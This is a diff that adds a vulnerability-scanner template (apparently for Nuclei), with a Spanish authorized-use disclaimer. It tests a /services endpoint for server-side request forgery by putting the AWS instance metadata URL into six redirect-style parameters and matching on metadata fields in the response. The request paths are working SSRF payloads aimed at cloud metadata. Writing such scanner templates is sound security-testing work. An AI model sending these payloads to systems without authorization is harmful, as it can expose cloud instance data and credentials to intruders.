@@ -1,0 +1,42 @@
+id: ssrf-cxf-services-metadata
+info:
+  name: SSRF via /services endpoint to AWS Metadata
+  author: josfull
+  severity: high
+  description: Detecta SSRF hacia AWS Metadata Service usando parámetros comunes en el endpoint /services.
+  tags: ssrf,cxf,aws,metadata,cloud
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/services?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/services?redirect=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/services?next=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/services?target=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/services?to=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/services?destination=http://169.254.169.254/latest/meta-data/"
+    headers:
+      User-Agent: Mozilla/5.0
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "ami-id"
+          - "instance-id"
+          - "hostname"
+        condition: or
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "Available SOAP services"
+          - "WSDL Documentation"
+          - "Apache CXF"
+      - type: status
+        status:
+          - 200
+          - 403
+          - 404
+#Josfull — Creador, escritor y pentester.
+#Descargo de responsabilidad: El contenido de este repositorio es solo para fines educativos e informativos; los autores no se hacen responsables de un uso indebido. Asegúrate de contar con la autorización adecuada antes de utilizarlo, actúa de forma responsable bajo tu propio riesgo y cumple todas las directrices legales y éticas.
